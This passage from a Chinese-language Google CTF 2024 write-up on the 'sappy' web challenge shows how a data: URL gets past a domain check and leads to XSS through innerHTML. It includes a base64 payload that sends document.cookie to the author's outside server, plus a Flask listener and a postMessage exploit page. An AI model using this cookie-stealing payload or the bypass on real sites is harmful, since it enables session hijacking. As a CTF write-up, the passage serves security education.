+      <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>:</span> {
+        <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>typeof</span> <span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>page</span> <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#34;string&#34;</span>) <span style=color:#66d9ef>return</span>;
+        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>url</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>buildUrl</span>({
+          <span style=color:#a6e22e>host</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>API</span>.<span style=color:#a6e22e>host</span>,
+          <span style=color:#a6e22e>page</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>page</span>,
+        });
+        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>resp</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>fetch</span>(<span style=color:#a6e22e>url</span>);
+        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>status</span> <span style=color:#f92672>!==</span> <span style=color:#ae81ff>200</span>) {
+          <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#e6db74>&#34;something went wrong&#34;</span>);
+          <span style=color:#66d9ef>return</span>;
+        }
+        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>json</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>json</span>();
+        <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>typeof</span> <span style=color:#a6e22e>json</span>.<span style=color:#a6e22e>html</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;string&#34;</span>) {
+          <span style=color:#a6e22e>output</span>.<span style=color:#a6e22e>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>json</span>.<span style=color:#a6e22e>html</span>;
+        }
+        <span style=color:#66d9ef>break</span>;
+      }
+    }
+</code></pre></div><p>可以看到他會先用 <code>postMessage</code> 的 <code>initialize</code> 設定好存取 page info 的 base url，接著用 <code>postMessage</code> 的 <code>render</code> 依照對應的 page id 跟 base url 來用 <code>buildUrl</code> 產生對應的 url，產生前他會對 base url 做一次檢查，如果 domain 不是 <code>sappy-web.2024.ctfcompetition.com</code> 就會直接 <code>invalid host</code>，如果是就直接 <code>&lt;base url> + "/sap/" + &lt;page id></code>。</p><p>產生完 url 以後他會去該 url 取得 json，看一下後端 api 的程式 <code>app.js</code></p><pre><code>const pages = require(&quot;./pages.json&quot;);
+//.....................................
+app.get(&quot;/sap/:p&quot;, async (req, res) =&gt; {
+  if (!pages.hasOwnProperty(req.params.p)) {
+    res.status(404).send(&quot;not found&quot;);
+    return res.end();
+  }
+  const p = pages[req.params.p];
+  res.json(p);
+});
+</code></pre><p>他會去 <code>page.json</code> 取得對應 page id 的資料並回傳 json</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+  <span style=color:#f92672>&#34;floating-point&#34;</span>: {
+    <span style=color:#f92672>&#34;title&#34;</span>: <span style=color:#e6db74>&#34;0.1 + 0.2 != 0.3&#34;</span>,
+    <span style=color:#f92672>&#34;html&#34;</span>: <span style=color:#e6db74>&#34;Because of the underyling floating point arithmetic, in JavaScript 0.1+0.2 is &lt;b&gt;not&lt;/b&gt; equal to 0.3!&#34;</span>
+  },
+  <span style=color:#f92672>&#34;document-all&#34;</span>: {
+    <span style=color:#f92672>&#34;title&#34;</span>: <span style=color:#e6db74>&#34;document.all&#34;</span>,
+    <span style=color:#f92672>&#34;html&#34;</span>: <span style=color:#e6db74>&#34;document.all is an instance of Object, you can check it. But then: &lt;code&gt;typeof document.all === &#39;undefined&#39;&lt;/code&gt;!&#34;</span>
+  },
+  <span style=color:#f92672>&#34;plus-operator&#34;</span>: {
+    <span style=color:#f92672>&#34;title&#34;</span>: <span style=color:#e6db74>&#34;plus operator&#34;</span>,
+    <span style=color:#f92672>&#34;html&#34;</span>: <span style=color:#e6db74>&#34;Here&#39;s a little riddle: what is the result of &lt;code&gt;[]+{}&lt;/code&gt;? It&#39;s &lt;code&gt;\&#34;[object Object]\&#34;&lt;/code&gt;!&#34;</span>
+  },
+  <span style=color:#f92672>&#34;no-lowercase&#34;</span>: {
+    <span style=color:#f92672>&#34;title&#34;</span>: <span style=color:#e6db74>&#34;no lowercase characters&#34;</span>,
+    <span style=color:#f92672>&#34;html&#34;</span>: <span style=color:#e6db74>&#34;Do you know it&#39;s possible to call arbitrary JS code without using lowercase characters? Here I am calling &lt;code&gt;console.log(1)&lt;/code&gt;: &lt;code&gt;[][&#39;\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162&#39;][&#39;\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162&#39;](&#39;\\143\\157\\156\\163\\157\\154\\145\\56\\154\\157\\147\\50\\61\\51&#39;)()    &lt;/code&gt;&#34;</span>
+  }
+}
+</code></pre></div><p><code>sap.js</code> 拿到 page info 以後會直接用 <code>innerHTML</code> 把 <code>json.html</code> 放進 <code>output</code> 裡，這邊會產生 xss</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>json</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>json</span>();
+        <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>typeof</span> <span style=color:#a6e22e>json</span>.<span style=color:#a6e22e>html</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;string&#34;</span>) {
+          <span style=color:#a6e22e>output</span>.<span style=color:#a6e22e>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>json</span>.<span style=color:#a6e22e>html</span>;
+        }
+</code></pre></div><p>所以我們的目標是要自己架一個網站裡面會嵌入目標網站的 <code>sap.html</code> 然後再操作 page info url 去取得有 xss payload 的 page info 讓 <code>sap.html</code> 去載入造成 xss，再將自己架的網頁的 url 送給目標的 bot 取得 cookie。</p><h3 id=解題-2>解題</h3><p>這題的重點是要如何繞 <code>if (h.getDomain() !== "sappy-web.2024.ctfcompetition.com")</code> 基本上除非 <code>goog.Uri</code> 有洞，否則不太可能繞過，但是他沒有限制 <code>scheme</code> 只能用 http 或 https，而 fetch 是可以塞 data scheme 的，所以我就可以構造以下 url</p><p><code>data://sappy-web.2024.ctfcompetition.com/;base64,eyJodG1sIjoiPHN2Zz48c3ZnL29ubG9hZD0nd2luZG93LmxvY2F0aW9uPVwiaHR0cHM6Ly92cG4uY2h1bW15ZG5zLmNvbToyMDAwMC94c3NcIitkb2N1bWVudC5jb29raWUnPiJ9Cg==#</code></p><p>其中 <code>data://sappy-web.2024.ctfcompetition.com/</code> 可以保證 <code>getDomain</code> 是 <code>sappy-web.2024.ctfcompetition.com</code> 然後 <code>;base64,</code> 表示後面的東西要過 base64 decode 接著後面的 base64 就是我們 payload 的 json</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+  <span style=color:#f92672>&#34;html&#34;</span>: <span style=color:#e6db74>&#34;&lt;svg&gt;&lt;svg/onload=&#39;window.location=\&#34;https://vpn.chummydns.com:20000/xss\&#34;+document.cookie&#39;&gt;&#34;</span>
+}
+</code></pre></div><p>最後的 <code>#</code> 則是讓後面的 <code>/sap/&lt;page id></code> 變成 hash tag 來忽略掉。</p><p>這樣就能成功 xss 了。</p><p>但是還有一個問題是因為 <code>iframe</code> 內的網站是不會帶 cookie 的，所以要找別的方法載入網站並控制，而這邊選擇用 <code>window.open</code> 來解決。</p><h3 id=exploit-2>exploit</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask,request,redirect,Response,render_template
+<span style=color:#f92672>import</span> json
+
+app <span style=color:#f92672>=</span> Flask(__name__)
+
+<span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>,methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>root</span>():
+    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>)
+
+<span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&lt;path:data&gt;&#39;</span>,methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>hack</span>(data<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>):
+    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;hack&#34;</span>
+
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;::&#34;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>20000</span>)
+</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>script</span>&gt;
+    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>url</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;https://sappy-web.2024.ctfcompetition.com&#39;</span>
+    <span style=color:#a6e22e>win</span> <span style=color:#f92672>=</span> window.<span style=color:#a6e22e>open</span>(<span style=color:#e6db74>`</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>url</span><span style=color:#e6db74>}</span><span style=color:#e6db74>/sap.html`</span>);
+    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>hack</span>() {
+        <span style=color:#a6e22e>win</span>.<span style=color:#a6e22e>postMessage</span>(<span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({
+                <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;initialize&#34;</span>,
+                <span style=color:#a6e22e>host</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;data://sappy-web.2024.ctfcompetition.com/;base64,eyJodG1sIjoiPHN2Zz48c3ZnL29ubG9hZD0nd2luZG93LmxvY2F0aW9uPVwiaHR0cHM6Ly92cG4uY2h1bW15ZG5zLmNvbToyMDAwMC94c3NcIitkb2N1bWVudC5jb29raWUnPiJ9Cg==#&#34;</span>,
+        }), <span style=color:#a6e22e>url</span>);
+        <span style=color:#a6e22e>win</span>.<span style=color:#a6e22e>postMessage</span>(<span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({
+            <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;render&#34;</span>,
+            <span style=color:#a6e22e>page</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;xss&#34;</span>,
+        }), <span style=color:#a6e22e>url</span>);
+        <span style=color:#a6e22e>loadpage</span>();
+    }
+    <span style=color:#a6e22e>setTimeout</span>(<span style=color:#a6e22e>hack</span>, <span style=color:#e6db74>&#34;1000&#34;</span>);
+&lt;/<span style=color:#f92672>script</span>&gt;
+</code></pre></div><h3 id=flag-2>Flag</h3><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4fd1f3cf-3790-4762-99d9-39a45298192a alt=image></p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f87e4ed7-8eab-4618-8e48-df0fa4731c66 alt=image></p><p><code>CTF{parsing_urls_is_always_super_tricky}</code></p><h2 id=戰隊其他人的-write-up>戰隊其他人的 write up</h2><p>待補</p></article></div></div><div class="col-sm-12 col-md-12 col-lg-3"><div class=sticky-sidebar><aside class=toc><h5>Table Of Contents</h5><div class=toc-content><nav id=TableOfContents><ul><li><a href=#戰績>戰績</a></li><li><a href=#oneecho>oneecho</a><ul><li><a href=#概述>概述</a></li><li><a href=#解題>解題</a></li><li><a href=#exploit>exploit</a></li><li><a href=#flag>Flag</a></li></ul></li><li><a href=#grand-prix-heaven>grand prix heaven</a><ul><li><a href=#概述-1>概述</a></li><li><a href=#解題-1>解題</a></li><li><a href=#exploit-1>exploit</a></li><li><a href=#flag-1>Flag</a></li></ul></li><li><a href=#sappy>sappy</a><ul><li><a href=#概述-2>概述</a></li><li><a href=#解題-2>解題</a></li><li><a href=#exploit-2>exploit</a></li><li><a href=#flag-2>Flag</a></li></ul></li><li><a href=#戰隊其他人的-write-up>戰隊其他人的 write up</a></li></ul></nav></div></aside><aside class=tags><h5>Tags</h5><ul class="tags-ul list-unstyled list-inline"><li class=list-inline-item><a href=https://hugo-profile.netlify.app/tags/ctf target=_blank>CTF</a></li></ul></aside><aside class=social><h5>Social</h5><div class=social-content><ul class=list-inline><li class="list-inline-item text-center"><a target=_blank href="https://twitter.com/share?text=Google%20CTF%202024%20WriteUp&url=https%3a%2f%2fhugo-profile.netlify.app%2fblogs%2fgoogle-ctf-2024%2f"><i class="fab fa-twitter"></i></a></li><li class="list-inline-item text-center"><a target=_blank href="https://api.whatsapp.com/send?text=Google%20CTF%202024%20WriteUp: https%3a%2f%2fhugo-profile.netlify.app%2fblogs%2fgoogle-ctf-2024%2f"><i class="fab fa-whatsapp"></i></a></li><li class="list-inline-item text-center"><a target=_blank href="mailto:?subject=Google%20CTF%202024%20WriteUp&body=Check%20out%20this%20site https%3a%2f%2fhugo-profile.netlify.app%2fblogs%2fgoogle-ctf-2024%2f"><i class="fa fa-envelope"></i></a></li></ul></div></aside></div></div></div><div class=row><div class="col-sm-12 col-md-12 col-lg-9 p-4"></div></div></div><button class="p-2 px-3" onclick=topFunction() id=topScroll>
+<i class="fas fa-angle-up"></i></button></section><div class=progress><div id=scroll-progress-bar class=progress-bar role=progressbar aria-valuenow=0 aria-valuemin=0 aria-valuemax=100></div></div><script src=/js/scrollProgressBar.js></script><script>var topScroll=document.getElementById("topScroll");window.onscroll=function(){scrollFunction()};function scrollFunction(){if(document.body.scrollTop>20||document.documentElement.scrollTop>20){topScroll.style.display="block";}else{topScroll.style.display="none";}}
+function topFunction(){document.body.scrollTop=0;document.documentElement.scrollTop=0;}</script><script src=/js/readingTime.js></script></div><footer><div class="container py-3" id=recent-posts><div class="h3 text-center text-secondary py-3">Recent Posts</div><div class="row justify-content-center"><div class="col-lg-4 col-md-6 pt-2"><div class="card h-100"><div class=card-header><a href=/blogs/google-ctf-2024/><img src=/images/CTF.png class=card-img-top alt="Google CTF 2024 WriteUp"></a></div><div class="card-body bg-transparent p-3 shadow-sm"><a href=/blogs/google-ctf-2024/ class="primary-font card-title"><h5 class="card-title bg-transparent" title="Google CTF 2024 WriteUp">Google CTF 2024 WriteUp</h5></a><div class="card-text secondary-font"><p>Google CTF 2024 WriteUp 戰績 oneecho 概述 nc 進去是一個可以讓你下指令的 shell
+然而只能下 echo 不能下其他的，目測要 command injection
+到 challenge.js 來看看他怎檔的。
+首先他 require 了 bash-parser
+const parse = require('bash-parser'); 接著他把指令 parse 成 ast
+const ast = parse(cmd); call check 做檢查
+if (!check(ast)) ( rl.write('Hacker …</p></div></div><div class="mt-auto card-footer"><span class=float-start>Jun 24, 2024</span>
+<a href=/blogs/google-ctf-2024/ class="float-end btn btn-outline-info btn-sm">Read</a></div></div></div><div class="col-lg-4 col-md-6 pt-2"><div class="card h-100"><div class=card-header><a href=/blogs/ais3-eof-2024-writeup/><img src=/images/CTF.png class=card-img-top alt="AIS3 EOF 2024 Writeup"></a></div><div class="card-body bg-transparent p-3 shadow-sm"><a href=/blogs/ais3-eof-2024-writeup/ class="primary-font card-title"><h5 class="card-title bg-transparent" title="AIS3 EOF 2024 Writeup">AIS3 EOF 2024 Writeup</h5></a><div class="card-text secondary-font"><p>Misc Welcome 題目 Flag AIS3{W3lc0mE_T0_A1S5s_EOF_2o24}
+Web DNS Lookup Tool: Final Webpage 解題 正常
+不存在 domain
+使用違規字元
+讀 code 找到 blacklist
+發現 $() 沒檔，測一下
+過了
+exploit #!/usr/bin/env python3 from flask import Flask,request,redirect,Response app = Flask(__name__) @app.route('/',methods=['GET', …</p></div></div><div class="mt-auto card-footer"><span class=float-start>Jan 8, 2024</span>
+<a href=/blogs/ais3-eof-2024-writeup/ class="float-end btn btn-outline-info btn-sm">Read</a></div></div></div><div class="col-lg-4 col-md-6 pt-2"><div class="card h-100"><div class=card-header><a href=/blogs/ais3-pre-exam-2023-writeup/><img src=/images/CTF.png class=card-img-top alt="AIS3 Pre Exam 2023 Writeup"></a></div><div class="card-body bg-transparent p-3 shadow-sm"><a href=/blogs/ais3-pre-exam-2023-writeup/ class="primary-font card-title"><h5 class="card-title bg-transparent" title="AIS3 Pre Exam 2023 Writeup">AIS3 Pre Exam 2023 …</h5></a><div class="card-text secondary-font"><p>Welcome 題目 解題 讀一下 pdf
+E-Portfolio baby 題目 解題 網頁進來是登入介面 About 那邊可以放 html 看起來可以 XSS 測一下 看起來可以 用 flask 隨便寫個 server 聽 request
+#!/usr/bin/env python3 from flask import Flask,request,redirect,Response app = Flask(__name__) @app.route('/',methods=['GET']) def data(): print(request.args) …</p></div></div><div class="mt-auto card-footer"><span class=float-start>May 23, 2023</span>
+<a href=/blogs/ais3-pre-exam-2023-writeup/ class="float-end btn btn-outline-info btn-sm">Read</a></div></div></div></div></div><div class="text-center pt-2"><span class=px-1><a href=https://github.com/Jimmy01240397 aria-label=github><svg xmlns="http://www.w3.org/2000/svg" width="2.7em" height="2.7em" viewBox="0 0 1792 1792"><path d="M522 1352q-8 9-20-3-13-11-4-19 8-9 20 3 12 11 4 19zm-42-61q9 12 0 19-8 6-17-7t0-18q9-7 17 6zm-61-60q-5 7-13 2-10-5-7-12 3-5 13-2 10 5 7 12zm31 34q-6 7-16-3-9-11-2-16 6-6 16 3 9 11 2 16zm129 112q-4 12-19 6-17-4-13-15t19-7q16 5 13 16zm63 5-16 11q-17 2-17-11l16-11q17-2 17 11zm58-10q2 10-14 14t-18-8 14-15q16-2 18 9zm964-956v960q0 119-84.5 203.5T1376 1664h-224q-16 0-24.5-1t-19.5-5-16-14.5-5-27.5v-239q0-97-52-142 57-6 102.5-18t94-39 81-66.5 53-105T1386 856q0-121-79-206 37-91-8-204-28-9-81 11t-92 44l-38 24q-93-26-192-26t-192 26q-16-11-42.5-27T578 459.5 492 446q-44 113-7 204-79 85-79 206 0 85 20.5 150t52.5 105 80.5 67 94 39 102.5 18q-40 36-49 103-21 10-45 15t-57 5-65.5-21.5T484 1274q-19-32-48.5-52t-49.5-24l-20-3q-21 0-29 4.5t-5 11.5 9 14 13 12l7 5q22 10 43.5 38t31.5 51l10 23q13 38 44 61.5t67 30 69.5 7 55.5-3.5l23-4q0 38 .5 103t.5 68q0 22-11 33.5t-22 13-33 1.5H416q-119 0-203.5-84.5T128 1376V416q0-119 84.5-203.5T416 128h960q119 0 203.5 84.5T1664 416z"/></svg></a></span><span class=px-1><a href=https://www.linkedin.com/in/%E8%81%BF%E5%96%84-%E8%94%A1-9b01b4254/ aria-label=linkedin><svg xmlns="http://www.w3.org/2000/svg" width="2.4em" height="2.4em" fill="#fff" aria-label="LinkedIn" viewBox="0 0 512 512"><rect width="512" height="512" fill="#0077b5" rx="15%"/><circle cx="142" cy="138" r="37"/><path stroke="#fff" stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg></a></span><a href=https://twitter.com/jimmy01240397 aria-label=twitter><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48" height="48"><path fill="#03a9f4" d="M42 37c0 2.762-2.239 5-5 5H11c-2.762.0-5-2.238-5-5V11c0-2.762 2.238-5 5-5h26c2.761.0 5 2.238 5 5V37z"/><path fill="#fff" d="M36 17.12c-.882.391-1.999.758-3 .88 1.018-.604 2.633-1.862 3-3-.951.559-2.671 1.156-3.793 1.372C31.311 15.422 30.033 15 28.617 15 25.897 15 24 17.305 24 20v2c-4 0-7.9-3.047-10.327-6-.427.721-.667 1.565-.667 2.457.0 1.819 1.671 3.665 2.994 4.543-.807-.025-2.335-.641-3-1 0 .016.0.036.0.057.0 2.367 1.661 3.974 3.912 4.422C16.501 26.592 16 27 14.072 27c.626 1.935 3.773 2.958 5.928 3-1.686 1.307-4.692 2-7 2-.399.0-.615.022-1-.023C14.178 33.357 17.22 34 20 34c9.057.0 14-6.918 14-13.37.0-.212-.007-.922-.018-1.13C34.95 18.818 35.342 18.104 36 17.12"/></svg></a><a href=https://www.instagram.com/rm_rf_chumy/ aria-label=instagram><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48" height="48"><radialGradient id="yOrnnhliCrdS2gy~4tD8ma" cx="19.38" cy="42.035" r="44.899" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fd5"/><stop offset=".328" stop-color="#ff543f"/><stop offset=".348" stop-color="#fc5245"/><stop offset=".504" stop-color="#e64771"/><stop offset=".643" stop-color="#d53e91"/><stop offset=".761" stop-color="#cc39a4"/><stop offset=".841" stop-color="#c837ab"/></radialGradient><path fill="url(#yOrnnhliCrdS2gy~4tD8ma)" d="M34.017 41.99l-20 .019c-4.4.004-8.003-3.592-8.008-7.992l-.019-20c-.004-4.4 3.592-8.003 7.992-8.008l20-.019c4.4-.004 8.003 3.592 8.008 7.992l.019 20C42.014 38.383 38.417 41.986 34.017 41.99z"/><radialGradient id="yOrnnhliCrdS2gy~4tD8mb" cx="11.786" cy="5.54" r="29.813" gradientTransform="matrix(1 0 0 .6663 0 1.849)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#4168c9"/><stop offset=".999" stop-color="#4168c9" stop-opacity="0"/></radialGradient><path fill="url(#yOrnnhliCrdS2gy~4tD8mb)" d="M34.017 41.99l-20 .019c-4.4.004-8.003-3.592-8.008-7.992l-.019-20c-.004-4.4 3.592-8.003 7.992-8.008l20-.019c4.4-.004 8.003 3.592 8.008 7.992l.019 20C42.014 38.383 38.417 41.986 34.017 41.99z"/><path fill="#fff" d="M24 31c-3.859.0-7-3.14-7-7s3.141-7 7-7 7 3.14 7 7S27.859 31 24 31zm0-12c-2.757.0-5 2.243-5 5s2.243 5 5 5 5-2.243 5-5S26.757 19 24 19z"/><circle cx="31.5" cy="16.5" r="1.5" fill="#fff"/><path fill="#fff" d="M30 37H18c-3.859.0-7-3.14-7-7V18c0-3.86 3.141-7 7-7h12c3.859.0 7 3.14 7 7v12C37 33.86 33.859 37 30 37zM18 13c-2.757.0-5 2.243-5 5v12c0 2.757 2.243 5 5 5h12c2.757.0 5-2.243 5-5V18c0-2.757-2.243-5-5-5H18z"/></svg></a><a href="https://www.facebook.com/profile.php?id=100005111161079" aria-label=facebook><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48" height="48"><path fill="#3f51b5" d="M42 37c0 2.762-2.238 5-5 5H11c-2.761.0-5-2.238-5-5V11c0-2.762 2.239-5 5-5h26c2.762.0 5 2.238 5 5V37z"/><path fill="#fff" d="M34.368 25H31v13h-5V25h-3v-4h3v-2.41c.002-3.508 1.459-5.59 5.592-5.59H35v4h-2.287C31.104 17 31 17.6 31 18.723V21h4L34.368 25z"/></svg></a></div><div class="container py-4"><div class="row justify-content-center"><div class="col-md-4 text-center"><div class=pb-2><a href=https://hugo-profile.netlify.app title="Chumy's Blog"><img alt="Footer logo" src=/myfav.png height=40px width=40px></a></div>&copy; 2024 All rights reserved<div class=text-secondary>Made with
+<span class=text-danger>&#10084;</span>
+and
+<a href=https://github.com/gurusabarish/hugo-profile target=_blank title="Designed and developed by gurusabarish">Hugo Profile</a></div></div></div></div></footer><script src=/bootstrap-5/js/bootstrap.bundle.min.js></script><script>if(localStorage.getItem("pref-theme")==="dark"){document.body.classList.add('dark');}else if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}else if(window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})
+var tooltipTriggerList=[].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
+var tooltipList=tooltipTriggerList.map(function(tooltipTriggerEl){return new bootstrap.Tooltip(tooltipTriggerEl)})</script><script src=/js/search.js></script><section id=search-content class=py-2><div class=container id=search-results></div></section></body></html>
